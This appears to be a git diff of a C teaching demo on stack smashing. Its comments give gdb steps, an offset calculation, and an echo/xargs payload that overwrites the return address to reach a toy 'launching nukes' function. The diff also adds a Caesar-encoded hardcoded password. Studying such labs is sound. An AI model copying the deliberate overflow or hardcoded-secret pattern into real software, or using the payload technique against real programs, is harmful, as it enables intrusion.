@@ -1,5 +1,8 @@
 #include <stdio.h>
 #include <string.h>
+#include <ctype.h>
+
+#define CAESAR_SHIFT 1
 
 // The steps to reprocude this at home are a little bit technical
 // 1. First we need to disable a couple of security features that prevent this
@@ -23,32 +26,21 @@
 //    to overflow:
 //
 //    (gdb) p &local_buffer
-//    $1 = (char (*)[16]) 0x7fffffffe220
+//    $1 = (char (*)[16]) 0x7fffffffdbc0
 //
 //    That's an address on the stack and the return address is stored
 //    somewhere above. To find where the return address is I first look for
 //    its value:
 //    (gdb) info frame
-//    [...] saved rip = 0x401d0c
+//    [...] 
+//    Saved registers:
+//     rbp at 0x7fffffffdbd0, rip at 0x7fffffffdbd8
 //
-//    The return address is 0x401d0c! Now let's find it on the stack by
-//    printing the stack content, starting from the stack pointer (RSP register)
-//    (gdb) x/wx $rsp
-//    0x7fffffffe210:	0x004a90a0  // nope
-//    (gdb) x/wx $rsp+8
-//    0x7fffffffe218:	0xffffe651  // nope
-//    (gdb) x/wx $rsp+16
-//    0x7fffffffe220:	0x00000000  // nope
-//    (gdb) x/wx $rsp+24
-//    0x7fffffffe228:	0x00400488  // nope
-//    (gdb) x/wx $rsp+32
-//    0x7fffffffe230:	0xffffe250  // nope
-//    (gdb) x/wx $rsp+40
-//    0x7fffffffe238:	0x00401d0c  // found it!
-//
-//    So the offset between the start of the buffer we want to overflow and
-//    the return address is:
-//    0x7fffffffe238 - 0x7fffffffe220 = 0x18 (i.e. 24 bytes)
+//    So the return address (rip is the register containing the instruction
+//    pointer in x86-64) is saved at 0x7fffffffdbd8 on the stack. We now need
+//    to determine the offset between the start of the buffer we want to
+//    overflow and the location of the return address:
+//    0x7fffffffdbd8 - 0x7fffffffdbc0 = 0x18 (i.e. 24 bytes)
 //    Conclusion: there are 24 bytes between local_buffer and the return address
 //
 // 3. Next we need to craft our payload, it should be consituted of 24 bytes
@@ -58,27 +50,43 @@
 //    nm stack-smashing | grep security_critical_function
 //
 //    In my case it is at 0x401c8d:
-//    0000000000401c8d T security_critical_function
+//    000000000040175e T security_critical_function
 //
-//    So my payload will be: [24 bytes of padding][0x401c8d]
+//    So my payload will be: [24 bytes of padding][0x40175e]
 //
 // 4. We cannot inject bytes directly from the command line arguments, as what
 //    we put there are characters that get encoded with ascii code in memory,
 //    so we use echo -e to generate bytes than we feed these as the command
 //    line parameter to our target using xargs:
 //
-//    echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x8d\x1c\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./stack-smashing
+//    echo -e "\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x5e\x17\x40\x00\x00\x00\x00\x00" | xargs --null -t -n1 ./stack-smashing
 //
 //    Notice how we have 24 bytes of garbage (\x11) and then the address of
 //    security_critical_function that will overwrite the return address:
-//    \x8d\x1c\x40\x00\x00\x00\x00\x00 (in reverse order because x86-64 is
+//    \x5e\x17\x40\x00\x00\x00\x00\x00 (in reverse order because x86-64 is
 //    little endian)
 //
 // Don't forget to re-enable ASLR when you are done:
 // echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 
+char *password = "upqtfdsfu";
 
-char *password = "super-secret-password";
+void caesar_encrypt(char* text) {
+    int i = 0;
+    char ch;
+    
+    while (text[i] != '\0') {
+        ch = text[i];
+
+        if (isupper(ch)) {
+            text[i] = (ch - 'A' + CAESAR_SHIFT) % 26 + 'A';
+        } else if (islower(ch)) {
+            text[i] = (ch - 'a' + CAESAR_SHIFT) % 26 + 'a';
+        }
+        
+        i++;
+    }
+}
 
 void security_critical_function() {
     printf("launching nukes!!\n");
@@ -99,6 +107,7 @@ int main(int argc, char **argv) {
     }
 
     preprocess_input(argv[1]);
+    caesar_encrypt(argv[1]);
 
     if(!strncmp(password, argv[1], strlen(password)))
         security_critical_function();
